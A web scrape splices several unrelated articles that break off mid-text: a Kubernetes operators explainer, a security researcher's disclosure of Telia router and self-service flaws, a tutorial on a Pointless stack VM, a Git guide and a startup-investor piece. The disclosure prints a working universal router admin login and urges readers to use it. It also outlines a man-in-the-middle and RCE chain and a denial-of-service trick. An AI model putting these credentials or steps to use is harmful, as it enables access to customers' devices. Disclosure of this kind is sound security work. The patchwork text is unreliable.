a custom resource?</h2><p>A custom resource extends Kubernetes capabilities by adding new kinds of objects that can be helpful for your application. Kubernetes provides two ways to add custom resources to clusters:</p><ul><li><strong>via API Aggregation</strong>, an advanced method that requires you to build your own API Server, but will give you more control</li><li><strong>via Custom Resource Definitions (CRD)</strong>, a simple way that can be created without any programming knowledge, as an extension to the original Kubernetes API server.</li></ul><p>These two options meet the needs of different users, who can choose between flexibility and ease of use. The Kubernetes community created a <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/#choosing-a-method-for-adding-custom-resources">comparison</a> that will help you decide what method is right for you, but the most popular choice is CRD.</p><h3 id="custom-resource-definitions">Custom Resource Definitions</h3><p>Custom Resource Definitions have been around for quite some time now; the first major API specification was released with Kubernetes 1.16.0. The manifest below presents an example:</p><div><pre><code data-lang="yaml"><span>apiVersion</span>: apiextensions.k8s.io/v1beta1
<span>kind</span>: CustomResourceDefinition
<span>metadata</span>:
  <span>name</span>: application.stable.example.com
<span>spec</span>:
  <span>group</span>: stable.example.com
  <span>version</span>: v1
  <span>scope</span>: Namespaced
  <span>names</span>:
    <span>plural</span>: application
    <span>singular</span>: applications
    <span>kind</span>: Application
    <span>shortNames</span>:
      - app
</code></pre></div><p>This CRD will allow you to create a CR called <em>Application</em>. (We are going to use it in the next section.) The first two lines define what <code>apiVersion apiextensions.k8s.io/v1beta1</code> of object kind <code>CustomResourceDefinition</code> you want to create.</p><p>The metadata describes the name of the resource, but the most important place here is the field <em>spec</em>. It lets you specify the group and version and the scope of visibility - namespaced or cluster-wide.</p><p>Afterwards, you define names in multiple formats and create a handy short name, which lets you perform a command <code>kubectl get app</code> to get the existing CR.</p><h3 id="custom-resource">Custom Resource</h3><p>The CRD above allows you to create the following manifest of a custom resource.</p><div><pre><code data-lang="yaml"><span>apiVersion</span>: stable.example.com/v1
<span>kind</span>: Application
<span>metadata</span>:
  <span>name</span>: application-config
<span>spec</span>:
  <span>image</span>: container-registry-image:v1<span>.0.0</span>
  <span>domain</span>: teamx.yoursaas.io
  <span>plan</span>: premium
</code></pre></div><p>As you can see, we can contain here all the necessary information required to run an application for a specific case. This custom resource will be observed by our operator - to be precise, by the operator’s custom controller. According to the built-in logic in the controller, the necessary actions will imitate the desired state. It can create a Deployment, Service, and necessary ConfigMaps for our application. Run it and expose it via ingress on a specific domain. This is just an example of a use case, but it can do whatever is designed.</p><p>Operators can also be used to provision resources that live outside Kubernetes. You can control the provisioning of external routers or create a database in the cloud without leaving the Kubernetes platform.</p><h2 id="kubernetes-operators-a-case-study">Kubernetes Operators: a Case Study</h2><p>To have a whole clear picture of Kubernetes Operators, let’s examine a <a href="https://github.com/coreos/prometheus-operator">Prometheus Operator</a>, one of the first and most popular operators. It simplifies the deployment and configuration of Prometheus, Alertmanager, and related monitoring components.</p><p>The core feature of the Prometheus Operator is to monitor the Kubernetes API server for changes to specific objects and ensure that the current Prometheus deployments match these objects. The Operator acts on the following Custom Resource Definitions (CRDs):</p><ul><li><strong>Prometheus</strong>, which defines a desired Prometheus deployment.</li><li><strong>Alertmanager</strong>, which defines a desired Alertmanager deployment.</li><li><strong>ServiceMonitor</strong>, which declaratively specifies how groups of Kubernetes services should be monitored.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>Multiple vulnerabilities could allow running arbitrary code on an intranet server and gain root access on all the customers' routers</p>

<p>Telia is a Swedish multinational telecommunications company. It also operates in Lithuania and provides mobile service, FTTH internet, DSL internet and IPTV. Telia rents and sells custom routers and set-top tv boxes to customers which have limited or almost no administration access left to them.</p>

<p>Every Telia router or tv box has a backdoor or "management interface". It is an <code>SSH</code> server running on VLAN 5 and/or WAN. Usually, it is running on port <code>8022</code>. Older models, like <code>ADB</code>, have password login enabled. The recent newer models, like <code>Technicolor</code>, have password login disabled and only use ssh with public key authentication (spoiler: it is still vulnerable).</p>

<p>Savitarna (in Lithuanian "Self service") - is a web service <a href="https://www.telia.lt/mano/sso">https://www.telia.lt/mano/sso</a> that allows Telia customers to order and manage services, get invoices, pay bills etc. It uses password authentication or external authority logins such as Facebook, Google, banking, digital signature etc. One of the new features: changing your router's wifi password. Sounds interesting, right? An internet web service that is able to change your local router's wifi password.</p>
<p>Login page:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-login.jpg" alt="Telia Savitarna web login page"></p>
<p>Change wifi settings:</p>

<p>How that works. When a user wants to change the password, the web service calls the backend to initiate an SSH connection to the user's associated router. Depending on the router it will be either password authentication or RSA public key. After a successful login a PHP script on the backend will issue some commands in the router's shell, parse the result and output some of the data to the user in the web UI, like wireless network name. <strong>Telia knows your WIFI password in plain text</strong>, keep it in mind and do not reuse this password anywhere. Overall scheme:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-backdoor-scheme.jpg" alt="Overall scheme of Telia backdoor"></p>

<p>Let's take a look at how the SSH connection is established. Network capture shows an SSH client banner and the remote IP that initiated the connection:</p>
<p><code>SSH-2.0-libssh2_1.4.2 PHP 10.0.98.251</code></p>
<p>What is important here:</p>
<ul>
<li>Vulnerable <code>libssh2</code> version <code>1.4.2</code> <a href="https://www.libssh2.org/security.html">https://www.libssh2.org/security.html</a></li>
<li>Weak and deprecated key exchange <code>diffie-hellman-group1-sha1</code></li>
<li>The client does not verify <code>remote SSH server public key</code> (see below)</li>
<li><code>PHP</code></li>
</ul>
<p>And, yes, it turns out that Telia's client does not attempt to verify the remote server's public key. We were able to start a custom SSH server on the same port 8022 and Savitarna successfully established a connection without even trying to verify for a man-in-the-middle. This means that we can see the password used and could try to create a malicious SSH server that exploits public vulnerabilities on Telia's side.</p>

<p>That was an easy task. As soon as Telia's client connected to our malicious SSH server we got the universal router credentials:</p>
<pre>User: tadmin
Password: hqMV8Wps
</pre>

<p>Do you still own an ADB router? Just go ahead and login over the web interface with this user. You are now an admin. You can do some restricted stuff now, great! But what about the root shell? We were able to connect with those credentials locally and got a limited shell. That's nice too. This gave us a lot of additional information that was hidden inside the router, many more vulnerabilities. Using one of them we were able to escalate to root and got full access over the device. The newer models like Technicolor require some additional exploits chained to gain full root access, but all are publicly available and so - easily doable.</p>

<p>In order to exploit RCE we needed to build a virtual test environment that fully copies Telia's PHP client. Step by step we have gone through the sequence of Telia's commands sent over the SSH. And finally we got a malicious SSH server and a test libssh2 client running in our test lab. With this server we could fully control the protocol and start fuzzing.</p>
<p>In the first few days of the fuzzing we got some crashes and partially confirmed that RCE may be exploited. Here is a sample GIF video that demonstrates two kinds of the issues the fuzzer found for us. Same php file was executed twice, but the malicious SSH server sent different payloads which caused:</p>
<ul>
<li>Segfault (stack corruption)</li>
<li>Infinite loop with high CPU</li>
</ul>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-poc.gif" alt="GIF PoC video"></p>
<p>However, at the time of the report we couldn't find an easy way to exploit the stack corruption. It may require more time, longer and more sophisticated fuzzing and more knowledge about the server. As Lithuanian law prohibits exploit testing on the real server, we could only fingerprint the Windows OS, but nothing more.</p>

<p>The backend seems to run only 5 php processes, so it is fairly easy to perform DoS by keeping stalled ssh connections. When SSH connections stay active for too long filling all the 5 php processes (there seems to be no timeout reading the remote shell), the Savitarna will show a strange "Maintenance" message:</p>
<p>Translation:</p>
<pre>An update is in progress
Too many of you are trying to access the new Telia webpage.
We are expanding the resources and will accept you all soon.
Apologies for any inconvenience
</pre>

<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-DoS.jpg" alt="Service unavailbale"></p>

<p>If we now get all together, an attacker could exploit RCE on the intranet server and use that server to move laterally (because <code>10.0.98.251</code> is whitelisted everywhere) across all the customer routers with the same credentials creating the most powerful, persistent and undetectable botnet of Lithuania. Who knows, maybe someone already exploited that? (spoiler: see bonus section)</p>

<p>The report was responsibly disclosed to Telia and a copy sent to <code>CERT LT</code> (<a href="https://www.nksc.lt/">NKSC</a>). What happened next was a little bit of a surprise to the team. There were rumours previously about Telia's poor tech level, but we have experienced this in a real case.</p>
<p>First, Telia did not have a PGP key and did not know how to use it, so instead they asked us to ZIP the report with password and send the password over a separate email (private GMail). I hope Telia's engineers will be reading this article, so I would like to explain why the report should be encrypted. This is to protect you as the affected vendor. If there is a man in the middle who can intercept all the researcher's traffic, it will be very easy to get the ZIP file in the first email and then the password in the second email. Instead, PKI like PGP only allows to decrypt the report by the private key owner, ensuring that nobody else can intercept the report and exploit the vulnerabilities before you fix them all. </p>
<p>Second, Telia tried to threaten the reporter for the vulnerability discovery:</p>
<p>Translation:</p>
<pre>Thank you for the information
Are you sure you did not violate the electronic data protection law?
</pre>

<p>Original:</p>
<pre>Dėkojame už informaciją.
Ar tikrai tyrimą atlikote ir neviešus elektroninius duomenis rinkote

<p>And then they once again mentioned that they will check if this report wasn't a hacking attempt and that they will persecute any reporter that discloses any information about Telia vulnerabilities:</p>
<p>Translation:</p>
<pre>Thank you for the information. We will continue to check whether you made your report
legally without violating any law. And we will ensure that no fake information will be
published that could do any harm to the company's reputation and to the critical part
of Lithuanian network infrastructure.
</pre>

<p>Original:</p>
<pre>Dėkojame Jums už pasidalintą informaciją, kurios surinkimo teisėtumo vertinimą toliau
atliekame ir tikimės, kad į viešumą nebus paskleista tikrovės neatitinkanti ar neteisėtai

<p>We will not comment on this and let the IT community to judge. At the same time we will no longer provide any reports in any form to Telia company.</p>

<p>* Note: partial fix for KEX means the new KEX is not considered to be weak, however it is now possible to exploit libssh2 vulnerabilities after 1.8.0 with this particular KEX and a publicly known exploit for <a href="https://github.com/Semmle/SecurityExploits/blob/446048470633bf0f8da9570d008d056dbaa28ea9/libssh2/out_of_bounds_read_kex_CVE-2019-13115/server/home/diff.txt">KexAlgorithms diffie-hellman-group-exchange-sha256</a></p>

<p>After getting the root access and analyzing the Telia's routers' firmwares, we found several more users, like <code>ladmin</code> and <code>technician</code>. We will not disclose those passwords (yet), as it is not clear yet how both are used. But we were surprised that Telia's passwords appeared to be leaked many years ago. You can try to search for the tadmin password's hash on the web and you will be surprised - there was an attempt to crack the hash back in 2014!</p>

<p>And finally, we found that the hash was cracked and was available in the old "weakpass" database. You can search for the "old" weakpass database (sometimes named "First version of weakpass") and grep it - password is there. This means that most probably we are not the first who were able to penetrate Telia.</p>

      <h3>Tutorial: Writing a VM for a Small Stack-Base Language in Pointless</h3>
      <pre>- Avery N. Nortonsmith</pre>

      <hr>

      <p>
        The age of functional programming will soon be over.
      </p>

      <p>
        Object-oriented programming has come and gone. Functional programming -- the wise, quiet observer -- has waited patiently for its turn. But FP, like OOP, will fade away in time as software yields to the inexorable pull of the one <em>True Paradigm</em>: stack-based programming!
      </p>

      <hr>

      <p>
        Joking aside, stack-based programming <em>is</em> pretty cool.
      </p>

      <p>
        This tutorial covers the implementation of a <strong>virtual-machine</strong> for a small, <strong>stack-based</strong> language in Pointless. We'll take an <strong>incremental</strong> approach to building the VM and improving its capabilities until it can run a short <strong>prime-factorization</strong> program.
      </p>

      This project seeks to demonstrate:

      <ul>
        <li>
          How an imperative language can be implemented in a purely functional context
        </li>

        <li>
          How to structure and refactor code that uses persistent data-structures
        </li>

        <li>
          How Pointless can -- even as a young language -- be used to solve non-trivial tasks
        </li>
      </ul>

      <p>
        Before we tackle prime-factorization, let's take a look at a small example of the stack-based code that our VM will evaluate. The following Pointless code defines a <a href="https://ptls.dev/docs.html#lists">list</a> of 'instructions', where <a href="https://ptls.dev/docs.html#tuples">labeled-tuples</a> are used to represent instructions with an argument, and <a href="https://ptls.dev/docs.html#labels">labels</a> are used for those without. A list of instructions like this represents a program in our stack-based language:
      </p>

      <div>
        <pre>program = [
  Const(7),
  Const(2),
  Mod,
  Const(0),
  Eq,
  Print,
  Exit,
]
</pre>
      </div>

      <p>
        Let's take a minute to fancy things up by writing a function to pretty-print these instruction lists -- this will come in handy later when we work with more complex programs. The function <code>showInst</code> below takes an instruction and returns a string showing the instruction's type (left-justified to 5 characters) and argument. The function <code>argOrBlank</code> returns an instruction's argument if there is one, or an empty string otherwise. 
      </p>

      <div>
        <pre>showInst(inst) =
 format("[ {&lt;5} ] {}", [getLabel(inst), argOrBlank(inst)])

argOrBlank(inst) =
  if is(PtlsTuple, inst) then unwrap(inst) else ""
</pre>
      </div>

      <p>
        In the code above, <code><a href="https://ptls.dev/api/prelude/format.html#format">format</a></code>, <code><a href="https://ptls.dev/api/prelude/label.html#getLabel">getLabel</a></code>, <code><a href="https://ptls.dev/api/prelude/types.html#is">is</a></code>, and <code><a href="https://ptls.dev/api/prelude/label.html#unwrap">unwrap</a></code> are defined in the Pointless <a href="https://ptls.dev/api/index.html">prelude</a> (standard-library).
      </p>

      <p>
        To see our new functions in action, we'll define an output variable for our program; in Pointless, a program's output is defined by its output variable. The prelude contains functions like <code><a href="https://ptls.dev/api/prelude/io.html#printLines">printLines</a></code> which generate sequences of IO commands that can be assigned to a program's output variable.
      </p>

      <p>
        The output definition below takes our list of instructions, generates a new list of instruction-strings by calling <code>showInst</code> on each instruction, and produces IO commands to print each string on a separate line. Take a look at the docs for more info on the function <a href="https://ptls.dev/docs.html#pipeOperator">pipe operator</a> <code>|&gt;</code>, and for <a href="https://ptls.dev/docs.html#partialApplication">partial application</a>.
      </p>

      <p><em>
        Note that the name 'main.ptls' is chosen arbitrarily; it doesn't have any special meaning
      </em></p>

      <div>
        <pre>output =
  program
  |&gt; map(showInst)
  |&gt; printLines
</pre>

      <pre>$ ./bin/pointless main.ptls

[ Const ] 7
[ Const ] 2
[ Mod   ] 
[ Const ] 0
[ Eq    ] 
[ Print ] 
[ Exit  ]
</pre>
      </div>

      <p>Seeing is believing. Time to start making our VM.</p>

      <p>
        We'll represent the VM as an <a href="https://ptls.dev/docs.html#objects">object</a> with the following fields:
      </p>

      <ul>
        <li><code>slots</code>: used to store "heap" variables (discussed later on)</li>
        <li><code>insts</code>: an array containing the program's instructions</li>
        <li><code>index</code>: the position in instruction array of the current instruction</li>
        <li><code>stack</code>: a linked-list serving as the stack for the VM</li>
        <li><code>outVal</code>: used to get output from VM as program runs</li>
      </ul>

      <p>
        The function <code>vmFromInsts</code> sets up a new VM object for a given list of instructions. The code also adds the label <code>VM</code> to the VM object (objects and tuples can be labeled in Pointless). Object labels can be used to write code that tells different types of objects apart, or simply for documentation (as we do here).
      </p>

      <div>
        <pre>vmFromInsts(program) = VM {
  slots  = zeroArray(8)
  insts  = toArray(program)
  index  = 0
  stack  = []
  outVal = None
}
</pre>
      </div>

      <p>
        To check that <code>vmFromInsts</code> works, we'll modify our output definition to create and print a new VM object. Note that we've replaced <code>printLines</code> with <code><a href="https://ptls.dev/api/prelude/io.html#println">println</a></code> -- <code>printLines</code> expects a sequence of values (and can print these values on-the-fly as they're computed in the case of lists!), whereas <code>println</code> can handle sequence and non-sequences types.
      </p>

      <div>
        <pre>output =
  program
  |&gt; vmFromInsts
  |&gt; println
</pre>

      <pre>$ ./bin/pointless main.ptls

VM {stack = []; insts = [Const(7) Const(2) Mod Const(0) Eq Print Exit]; slots = [0 0 0 0 0 0 0 0]; index = 0; outVal = None}
</pre>
      </div>

      <p>
        We run the program, and see that <code>println</code> gives us a nice visualization of our initial VM object, fields and all.
      </p>

      <p>
        Back to our list of instructions:
      </p>

      <div>
        <pre>program = [
  Const(7),
  Const(2),
  Mod,
  Const(0),
  Eq,
  Print,
  Exit,
]
</pre>
      </div>

      <p>
        The instructions above do the following -- (once we've implemented them, that is):
      </p>

      <ul>
        <li><code>Const(arg)</code> pushes <code>arg</code> onto the VM stack</li>
        <li><code>Mod</code> pops values <code>v0</code> and <code>v1</code> from the stack, and pushes <code>v1 % v0</code></li>
        <li><code>Eq</code> pops values <code>v0</code> and <code>v1</code> from the stack, and pushes <code>v1 == v0</code></li>
        <li><code>Print</code> pops a value from the stack and prints it</li>
        <li><code>Exit</code> signals the end of the program</li>
      </ul>

      <p>
        Additionally, each of these instructions will advance the VM to the next instruction after performing the behaviors above. Nice and imperative ;)
      </p>

      <p>
        With this in mind, we see that the program above does the following: loads the values <code>7</code> and <code>2</code> onto the stack, computes <code>7 % 2</code>, loads the value <code>0</code>, compares <code>0</code> with the result of <code>7 % 2</code>, prints the result of this comparison, and exits. In other words, this program tells us whether or not <code>7</code> is even.
      </p>

      <p>
        Now that we've defined some instructions, let's start evaluating them.
      </p>

      <div>
        <pre>eval(vm) = cond {
  case is(Const, vm.insts[vm.index])
    vm with $.stack = [unwrap(vm.insts[vm.index])] ++ vm.stack
}
</pre>
      </div>

      <p>
        Our <code>eval</code> function uses a <code><a href="https://ptls.dev/docs.html#cond">cond</a></code> conditional -- eventually this will include cases for all instructions, but we'll start with just <code>Const</code> for now. The code above calls the function <code><a href="https://ptls.dev/api/prelude/types.html#is">is</a></code> to check whether the current instruction has the label <code>Const</code> (where the current instruction is the instruction in the <code>vm.insts</code> array at index <code>vm.index</code>). If <code>is</code> returns true, then conditional evaluates and returns the body of the case expression.
      </p>

      <p>
        Structures in Pointless persistent, and thus immutable. As such, our program will never mutate the state of a VM object; rather, it will produce new VM objects. The code above uses <a href="https://ptls.dev/docs.html#viaWith">with syntax</a> (which can handle both shallow and nested updates -- one of Pointless's little innovations) to create a new VM object with a new stack value: the old stack with the instruction argument pushed to the top. The <code>unwrap</code> function is used to get the argument from the <code>Const</code> instruction.
      </p>

      <p>
        The code above is dense and repetitive! We can improve it by defining a couple of variables. In the new version, <code>inst</code> is the current instruction, and the <code>arg</code> is the argument of that instruction.
      </p>

      <div>
        <pre>eval(vm) = cond {
  case is(Const, inst)
    vm with $.stack = [arg] ++ vm.stack

} where {
  inst = vm.insts[vm.index]
  arg = unwrap(inst)
}
</pre>
      </div>

      <p>
        We modify the program's output definition to call <code>eval</code> on the VM to evaluate the first instruction, <code>Const(7)</code>. Looking at output, we see that the value <code>7</code> has been pushed to the stack.
      </p>

      <p><em>
        <code>insts</code> field abbreviated for readability
      </em></p>

      <div>
        <pre>output =
  program
  |&gt; vmFromInsts
  |&gt; eval
  |&gt; println
</pre>

      <pre>$ ./bin/pointless main.ptls

VM {stack = [7]; insts = ...; slots = [0 0 0 0 0 0 0 0]; index = 0; outVal = None}
</pre>
      </div>

      <p>
        But wait! We need our <code>Const</code> handler to do one more thing -- advance the VM to the next instruction. To do this, we'll make a new helper function <code>advance</code> that takes a VM object and returns a new VM object with the instruction index incremented. We'll also move the code for pushing a value onto the VM stack into the new function <code>pushVal</code>.
      </p>

      <div>
        <pre>advance(vm) = vm with $.index += 1

pushVal(arg, vm) = vm with $.stack = [arg] ++ vm.stack
</pre>
      </div>

      <p>
        Using these two new functions, the code for <code>eval</code> becomes:
      </p>

      <div>
        <pre>eval(vm) = cond {
  case is(Const, inst)
    vm
    |&gt; pushVal(arg)
    |&gt; advance

} where {
  inst = vm.insts[vm.index]
  arg = unwrap(inst)
}
</pre>

      <pre>$ ./bin/pointless main.ptls

VM {stack = [7]; insts = ...; slots = [0 0 0 0 0 0 0 0]; index = 1; outVal = None}
</pre>
      </div>

      <p>
        We call the program again and get the result seen above: the new VM object returned by <code>eval</code> has the value <code>7</code> on its stack and its index incremented.
      </p>

      <p>
        At this point, the entire program looks something like this:
      </p>

      <p><em>
        Note that the comment bars are not necessary, but are helpful for dividing code visually -- it's a habit of mine, like using fake em-dashes. They can also be used to mark API documentation
      </em></p>

      <div>
        <pre>output =
  program
  |&gt; vmFromInsts
  |&gt; eval
  |&gt; println

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p><h3>January 27, 2019</h3><h3>16 min read</h3></p><h3>Last updated: October 16, 2019</h3><hr><h2 id="what-is-git-and-why-should-i-care"><a href="#what-is-git-and-why-should-i-care" aria-label="what is git and why should i care permalink"></a>What is Git and why should I care?</h2><p>Git is a <strong>distributed version-control system</strong> - i.e. it records the changes made to files in a repository of code as a series of snapshots called <strong><em>commits</em></strong>, stored on many servers. Think of this like your standard cloud backup on steroids - not only are you able to restore your code in event of a crash, but you can also <strong>roll back</strong> your code to any of the snapshots if your code breaks. It is also easy for you to <strong>collaborate</strong> with others - again just like how you can work on the same Google Docs file with multiple people, multiple developers can simultaneously edit the same repository and record their individual changes.</p><p>Thanks to these advantages, Git is a <strong>must-know</strong> for anyone looking to enter the world of software development. This post will provide an overview of the most useful commands in Git and when to use them, and also serves as a reference for when you need to brush up on Git.</p><h2 id="the-git-workflow"><a href="#the-git-workflow" aria-label="the git workflow permalink"></a>The Git Workflow</h2><p>There are a lot of Git commands, so it’s useful to group them by topic / use-case. We’ll first consider Git on a single machine, since most of Git’s operations are local and we can then build up to multi-user Git usage.</p><p>Git can either be run using the command line, or using a GUI such as GitHub Desktop. Although the command line may be more intimidating for new developers, it also is far more powerful and you will need to learn it since most GUIs offer limited commands.</p><p>Git commands typically take the form of <code>git &lt;command&gt; &lt;args&gt;</code> where <code>&lt;args&gt;</code> might be a file path. Commands may also have <em>options</em> specified denoted by a <code>--&lt;option&gt;</code> or a <code>-&lt;single-letter-option&gt;</code> - think of these as adding extra details as to what the command should do. In this guide, I will present the general syntax and you should replace anything in <code>&lt;&gt;</code> with your corresponding value.</p><p>If you are uncertain about the usage of a command, a really useful command is:
<code>git help &lt;command&gt;</code>
which brings up the manual, or for a refresher <code>git &lt;command&gt; -h</code> or <code>git &lt;command&gt; --help</code> (<code>--help</code> and <code>-h</code> are equivalent).</p><h2 id="setting-up-git"><a href="#setting-up-git" aria-label="setting up git permalink"></a>Setting up Git</h2><h3 id="installing-git"><a href="#installing-git" aria-label="installing git permalink"></a>Installing Git</h3><p><strong>Windows</strong>: Head to <a href="https://git-scm.com/download/win">https://git-scm.com/download/win</a></p><p><strong>MacOS</strong>: Git comes as part of XCode Command Line Tools, so install that. To check if you’ve installed Git already open a Terminal window and type <code>git --version</code> to check which version you have.</p><p><strong>Linux</strong>: Run <code>sudo apt install git-all</code> (Debian-based) in the terminal or <code>sudo dnf install git-all</code> (RPM-based).</p><h3 id="set-up-configuration-file"><a href="#set-up-configuration-file" aria-label="set up configuration file permalink"></a>Set up Configuration File</h3><p>The first thing to do having installed Git is to set up your user name and email address, since these are used to identify you and stored in all snapshots you make. This is stored in a <strong>configuration file</strong> where you store all your preferences.</p><p>You can either edit this <code>.gitconfig</code> file directly using a text editor or <code>git config --global --edit</code> or instead alter specific fields with <code>git config --global &lt;field&gt; &lt;value&gt;</code> - we’re interested in the fields <code>user.name</code> and <code>user.email</code>.</p><p>We can also configure the text editor we use for commits using the field <code>core.editor</code> - initially this is set to the system default editor (e.g vi for Linux/Mac). <code>commit.template &lt;template_file&gt;</code> lets you specify a template that comes up whenever you commit.</p><p>There are many other fields, however one particular field I find especially useful is <code>alias</code> which maps commands to abbreviations: <code>alias.&lt;ab&gt; &lt;command&gt;</code>.
e.g. <code>git config --global alias.st "status -s"</code> maps <code>git status -s</code> to <code>git st</code>.</p><p><code>git config --list</code> lists all the fields and values from the config file.</p><h3 id="create-a-git-repository"><a href="#create-a-git-repository" aria-label="create a git repository permalink"></a>Create a Git repository</h3><p>To initialise a .git repository you can use <code>git init</code> or, if you want a copy of an existing repository, you can do <code>git clone &lt;repo_url&gt;</code>.</p><p><img src="https://mukulrathi.co.uk/317c63680d60850c4b4035e791ecd896/setup.svg" alt="Setup Terminal"></p><h2 id="git-commit-history"><a href="#git-commit-history" aria-label="git commit history permalink"></a>Git Commit History</h2><p><img src="https://mukulrathi.co.uk/f66fde04be4a0bf374458ed35fff4e77/commit-history.svg" alt="Git Commit History Diagram"></p><p>Git stores data as a series of lightweight “snapshots” known as <strong>commits</strong> - these store the state of the filesystem at that time as well as a pointer to the previous commit(s). Each commit has a unique <em>checksum</em> - the ID Git uses to refer to it.
To keep track of the history, Git has a <strong>HEAD</strong> pointer that points to the first commit (we follow the pointer chain back to see previous commits).</p><p>So we can refer to a commit either by its checksum, or its relation to HEAD, e.g. <code>HEAD~4</code> refers to the commit 4 commits before the HEAD commit.</p><h2 id="the-git-file-system"><a href="#the-git-file-system" aria-label="the git file system permalink"></a>The Git File System</h2><p><img src="https://mukulrathi.co.uk/4b6c8479c4391d055b65a8d2a2598187/file-system.svg" alt="Git File System  Diagram"></p><p>Git keeps track of files in 3 main sections:</p><ul><li>Working Directory (this is your computer’s filesystem)</li><li>Staging Area (this stores the contents of your next commit)</li><li>HEAD (the most recent commit in the .git repository)</li></ul><p>All of the main file commands boil down to understanding how Git maintains these three sections. A common misconception is that the staging area only stores changes - a better way to think of these is as <strong>3 separate file systems</strong>, each with their own copies of the files.</p><h3 id="view-changes-in-the-git-file-systems"><a href="#view-changes-in-the-git-file-systems" aria-label="view changes in the git file systems permalink"></a>View changes in the Git File Systems</h3><p><code>git status</code> displays any files that differ between the 3 sections. Files have 4 states:</p><ul><li><em>Untracked</em> - in Working Dir but no version stored in HEAD or Staging Area (Git doesn’t know about file)</li><li><em>Modified</em> - newer version in Working Dir compared to Staging Area and HEAD. (changes not in next commit)</li><li><em>Staged</em> - newer version in Staging Area and Working Dir compared to HEAD. (ready to be committed)</li><li><em>Unmodified</em> - same version in all 3 sections (i.e. most recent commit has latest version)</li></ul><p>Note: a file can be both modified and staged, if the version in the working directory is newer than that in the staging area, which in turn is newer than the one in the HEAD commit.</p><p>We can use the <code>-s</code> option for <code>git status</code> to get a cleaner (one line per file) output. This displays <strong>??</strong> if a file is not tracked, <strong>red</strong> if modified and <strong>green</strong> if staged.</p><p>To view the actual changes and not just the files that have changed, you can use:</p><ul><li><code>git diff</code> - see the unstaged changes i.e. compare working directory with staging area.</li><li><code>git diff --staged</code> - see the staged changes i.e. compare staging area with HEAD.</li></ul><p>Adding the <code>&lt;file/dir&gt;</code> argument restricts the diff to that those files. e.g. <code>git diff src/</code></p><h3 id="update-the-git-file-systems"><a href="#update-the-git-file-systems" aria-label="update the git file systems permalink"></a>Update the Git File Systems</h3><p><code>git add &lt;file/directory&gt;</code> updates the staging area with the version of the file/directory in the working directory.</p><p><code>git commit</code> updates HEAD with a new commit that snapshots the files in the staging area.</p><p><code>git reset &lt;commit&gt;</code> has three potential steps:</p><ol><li>Point HEAD to <code>&lt;commit&gt;</code> (e.g. if rolling back a commit,staging area and working dir will now have newer version of files than HEAD). Also points branch’s HEAD to that commit. (see Branching section)</li><li>Update Staging Area with contents of <code>&lt;commit&gt;</code>. (this has the effect of unstaging file changes - only Working dir. has newest version)</li><li>Update Working Dir with contents of Staging Area (has effect of overwriting and destroying changes to data - <strong>dangerous - take care</strong>)</li></ol><p>By default, <code>git reset</code> only runs Step 1 + 2 however, the options <code>--soft</code> (only run Step 1) and <code>--hard</code> (run Step 1, 2, 3) modify its behaviour.</p><p>If we pass a file path, <code>git reset &lt;commit&gt; &lt;file/dir&gt;</code> it limits effect of <code>reset</code> to files in that file path e.g. <code>git reset --soft HEAD~1 src/</code>.</p><p><code>git checkout HEAD &lt;file&gt;</code> also has the same effect as <code>git reset --hard HEAD &lt;file&gt;</code> - it overwrites the version of the file in the staging area and working directory with the version at HEAD (effectively undoing your changes since the last commit).</p><p><code>git checkout &lt;file&gt;</code> on the other hand (note no <code>HEAD</code>) overwrites the version of the file in the working directory with the version in the staging area (effectively undoing your changes since the last staged version).</p><p>Finally, <code>git rm &lt;file&gt;</code> untracks the file and deletes it from working directory, the option <code>--cached</code> will untrack a file but not delete it from the working directory.</p><p><img src="https://mukulrathi.co.uk/3a5894bb13482084888f9dbffc12737c/manipulate-files.svg" alt="Git status demonstration"></p><h3 id="ignoring-files"><a href="#ignoring-files" aria-label="ignoring files permalink"></a>Ignoring files</h3><p>Often we don’t want Git to track all of our files in our repository.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article>
<p><span>When building your startup you can have a great idea and the perfect market conditions and still come up short. For both your startup and investors, execution is key.</span></p>
<p><span>Just look at this slide I found from Alexander Jarvis on Quora:</span></p>
<figure><img src="https://cdn-images-1.medium.com/max/720/0*4ssSy22XC1crcL3k" alt="Mark Suster on what startup investors look for in entrepreneurs: 70% of my investment decision of an early-stage company is the team" width="720" height="432" data-image-id="0*4ssSy22XC1crcL3k" data-width="1085" data-height="651"></figure>
<p><span>You and your startup team, especially at a management level, are a huge factor as to whether you secure investment or if your pitch ends up in an investor’s trash can.&nbsp;</span></p>
<p><span>And the first person investors look at as they decide whether or not you are deserving of their time and money is you, the founder.</span></p>
<h2><span>What Startup Investors Look For In Entrepreneurs and The Red Flags They Avoid&nbsp;</span></h2>
<p><span>Investors, like most educated gamblers, bet on the jockey – not the horse. Making you the most important asset for a successful fundraising round – especially if you have a proven track record. </span><a href="https://medium.com/startupsoft/why-vcs-almost-blindly-invest-in-founders-with-previous-exits-23824334a260" target="_blank" rel="noopener noreferrer"><span>Studies show</span></a><span> that:</span></p>
<h3><em><strong><span>“Successful serial entrepreneurs are more likely to replicate the success of their past companies.” and “Nearly 80% of [startup] unicorns had at least one co-founder who had previously founded a company of some sort.”&nbsp;</span></strong></em></h3>
<p><span>However, regardless of your previous success investors need to get to know you before they consider investing. They need to trust that you can execute your milestones and that you will provide a valuable ROI. To earn their trust and ultimately win them over you need these essential qualities:&nbsp;</span></p>
<ul>
<li><span>Character</span></li>
<li><span>Confidence</span></li>
<li><span>Coachability&nbsp;</span></li>
</ul>
<h3><b>Character</b></h3>
<p><span>Renowned leadership guru </span><a href="https://www.linkedin.com/in/simonsinek/" target="_blank" rel="noopener noreferrer"><span>Simon Sinek</span></a><span> states that “People don’t buy </span><b>what you do</b><span>; they buy </span><b>why you do it.</b><span>”</span></p>
